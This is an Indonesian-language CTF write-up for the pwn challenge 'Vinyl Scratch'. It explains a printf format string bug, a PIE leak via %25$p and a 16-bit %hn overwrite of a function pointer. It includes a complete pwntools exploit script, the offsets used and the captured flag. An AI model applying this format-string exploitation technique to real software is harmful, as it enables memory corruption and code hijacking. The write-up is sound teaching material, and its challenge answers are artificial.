# 7. Vinyl Scratch

**Kategori:** Pwn / Binary Exploitation  
**Target:** `cyberleague-shared-nlb-8eebe09f116ebe55.elb.ap-southeast-1.amazonaws.com:30003`  
**Flag format:** `CYBERLEAGUE{...}`



## Deskripsi

Antarmuka review sebuah toko vinyl memproses review melalui `printf(review)`. Mitigasi binary cukup lengkap, tetapi format string dapat digunakan untuk read + write.

## 7.1 Format String Vulnerability

Bug inti:

```c
printf(review);
```

bukan:

```c
printf("%s", review);
```

Akibatnya attacker dapat mengontrol format string.

Primitive yang tersedia:

```text
%p   → arbitrary stack read / leak
%n   → arbitrary write
%hn  → 16-bit write
```

## 7.2 Leak PIE dengan `%25$p`

Format string:

```text
%25$p
```

pada stack position tersebut membocorkan saved return address.

Offset terhadap binary:

```text
LEAK_OFFSET = 0x1325
```

Sehingga:

```text
PIE base = leaked_RIP - 0x1325
```

## 7.3 Target Write

Terdapat function pointer writable:

```text
exit_handler
```

yang secara normal menunjuk ke `normal_exit`.

Saat menu `3` dipilih, program memanggil:

```c
exit_handler();
```

Sementara itu ada fungsi internal:

```text
print_flag()
```

yang membuka `/flag`.

Target eksploitasi:

```text
exit_handler → print_flag
```

## 7.4 Mengapa `%hn`

Kita tidak perlu menulis alamat 64-bit seluruhnya.

Karena PIE base dan target berada pada mapping yang sama, low 16-bit sudah cukup pada layout challenge ini.

Nilai yang ditulis:

```python
write_value = print_flag & 0xffff
```

## 7.5 Positional Argument

Pointer target diletakkan pada offset `0x40` di buffer.

Mapping argument menunjukkan:

```text
buffer + 0x00 → arg #6
buffer + 0x08 → arg #7
...
buffer + 0x40 → arg #14
```

Maka write dilakukan dengan:

```text
%14$hn
```

## 7.6 Solver

```python
#!/usr/bin/env python3
from pwn import *

HOST = "cyberleague-shared-nlb-8eebe09f116ebe55.elb.ap-southeast-1.amazonaws.com"
PORT = 30003
BIN = "./dist/chall"

context.binary = BIN
context.arch = "amd64"
context.log_level = "info"

elf = ELF(BIN, checksec=False)


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(BIN)


def choose_review(io):
    io.sendlineafter(b"> ", b"2")


def choose_exit(io):
    io.sendlineafter(b"> ", b"3")


io = start()

# Stage 1: PIE leak
choose_review(io)
io.sendlineafter(b"Your review: ", b"%25$p")
io.recvuntil(b"Preview: ")

leak_raw = io.recvline().strip()
pie_leak = int(leak_raw, 16)

LEAK_OFFSET = 0x1325
pie_base = pie_leak - LEAK_OFFSET

log.success(f"PIE leak : {pie_leak:#x}")
log.success(f"PIE base : {pie_base:#x}")

# Stage 2: target addresses
EXIT_HANDLER_OFFSET = 0x4010
PRINT_FLAG_OFFSET = 0x1570

exit_handler = pie_base + EXIT_HANDLER_OFFSET
print_flag = pie_base + PRINT_FLAG_OFFSET

write_value = print_flag & 0xffff

# buffer+0x40 = argument #14
fmt = f"%1${write_value}c%14$hn".encode()

payload = fmt.ljust(0x40, b"A")
payload += p64(exit_handler)

log.info(f"exit_handler = {exit_handler:#x}")
log.info(f"print_flag   = {print_flag:#x}")
log.info(f"payload size = {len(payload)}")

# Stage 3: overwrite function pointer
choose_review(io)
io.sendlineafter(b"Your review: ", payload)

# Stage 4: trigger print_flag()
choose_exit(io)

output = io.recvrepeat(2)
print(output.decode(errors="replace"))

io.interactive()
```

## 7.7 Offset Penting

| Item | Nilai |
|---|---:|
| Saved RIP leak offset | `0x1325` |
| `exit_handler` offset | `0x4010` |
| `print_flag` offset | `0x1570` |
| Target pointer in buffer | `0x40` |
| Leak positional arg | `%25$p` |
| Write positional arg | `%14$hn` |

## 7.8 Verifikasi

```text
========== OUTPUT ==========
CYBERLEAGUE{v1nyl_f0rm4t_wr1t3_p13_c0mb0}
```

## Flag

```text
CYBERLEAGUE{v1nyl_f0rm4t_wr1t3_p13_c0mb0}
```

---
